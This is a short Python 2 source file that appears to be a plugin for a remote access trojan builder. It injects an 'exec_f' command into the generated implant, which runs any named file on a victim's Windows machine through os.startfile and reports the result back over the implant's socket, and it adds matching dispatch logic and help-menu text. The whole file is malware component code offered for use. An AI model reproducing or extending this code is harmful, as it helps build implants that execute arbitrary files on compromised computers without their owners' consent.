# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from os import startfile')
        config.functions.append('''
def exec_f(file):
    startfile(file.split(' ',1)[1])
    s.sendall('[+]Executed : ' + file.split(' ',1)[1])''')
        config.logics.append('''
            elif command == "exec_f":
                exec_f(data)''')
        config.help_menu['exec_f <Remote file path>'] = 'Will open and execute any file that is specified as the argument'
    elif option == 'info':
        print '\nName             : Execute file component' \
              '\nOS               : Windows' \
              '\nRequired Modules : os' \
              '\nCommands         : exec_f <Remote file path>' \
              '\nDescription      : Will open and execute any file that is specified as the argument\n'
